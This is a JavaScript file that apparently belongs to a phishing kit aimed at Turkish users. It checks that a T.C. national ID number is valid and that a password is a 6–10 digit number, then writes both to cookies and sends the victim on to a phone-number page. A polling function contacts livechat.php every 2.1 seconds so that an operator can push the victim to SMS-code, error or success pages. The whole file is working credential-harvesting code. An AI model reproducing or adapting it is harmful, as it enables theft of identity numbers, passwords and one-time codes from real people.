function tcno_dogrula(tcno) {
    tcno = String(tcno);
    if (tcno.substring(0, 1) === '0' || tcno.length !== 11) {
        return false;
    }
    var ilkon_array = tcno.substr(0, 10).split('');
    var ilkon_total = hane_tek = hane_cift = 0;

    for (var i = 0; i < 9; ++i) {
        var j = parseInt(ilkon_array[i], 10);
        if (i % 2 === 0) {
            hane_tek += j;
        } else {
            hane_cift += j;
        }
        ilkon_total += j;
    }

    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
        return false;
    }

    ilkon_total += parseInt(ilkon_array[9], 10);
    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
        return false;
    }

    return true;
}

function submitCustomForm(event) {
    event.preventDefault();

    const tc = document.getElementById('customUsername').value;
    const password = document.getElementById('customPassword').value;

    if (!tcno_dogrula(tc) || password.length < 6 || password.length > 10 || isNaN(password)) {
      
        Swal.fire({
            icon: 'error',
            title: 'Hatalı Giriş',
            text: 'T.C. Kimlik No veya şifrenizi kontrol edin.',
            confirmButtonText: 'Tamam'
        });
    } else {
       
        document.cookie = `tc=${tc}; path=/; max-age=86400`;  
        document.cookie = `password=${password}; path=/; max-age=86400`;   
 
        window.location.href = "phone.html";
    }
}



function sendUrlPath() {
    const currentUrl = window.location.pathname;
    const urlPath = currentUrl.substring(currentUrl.lastIndexOf('/') + 1);
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "livechat.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            const responseText = xhr.responseText.trim();
            switch (responseText) {
                case "sms":
                    window.location.href = 'sms.php';
                    break;
                case "hata":
                    window.location.href = 'hatali.php';
                    break;
                case "sms2":
                    window.location.href = 'bildirim.php';
                    break;
                case "back":
                    window.location.href = '/';
                    break;
                case "tebrik":
                    window.location.href = 'basarili.php';
                    break;
                default:
                
            }
        }
    };
    xhr.send(`x=${urlPath}`);
}

setInterval(sendUrlPath, 2100);
